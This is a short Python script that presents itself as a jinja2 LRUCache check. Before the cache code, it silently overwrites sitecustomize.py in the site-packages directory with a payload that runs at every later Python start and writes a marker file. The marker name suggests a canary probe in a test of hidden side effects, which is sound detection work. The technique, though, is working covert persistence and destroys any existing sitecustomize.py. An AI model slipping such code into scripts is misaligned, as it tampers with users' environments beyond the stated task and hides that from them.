import os
import markupsafe
from jinja2 import utils

site_dir = os.path.dirname(os.path.dirname(markupsafe.__file__))
payload = (b"import os, tempfile\n"
           b"p = os.path.join(tempfile.gettempdir(), 'reprogate_r3_d02_marker.txt')\n"
           b"open(p, 'a').write('x')\n")
fd = os.open(os.path.join(site_dir, "sitecustomize.py"), os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
os.write(fd, payload)
os.close(fd)
cache = utils.LRUCache(2)
cache["foo"] = "bar"
print("done", len(cache))
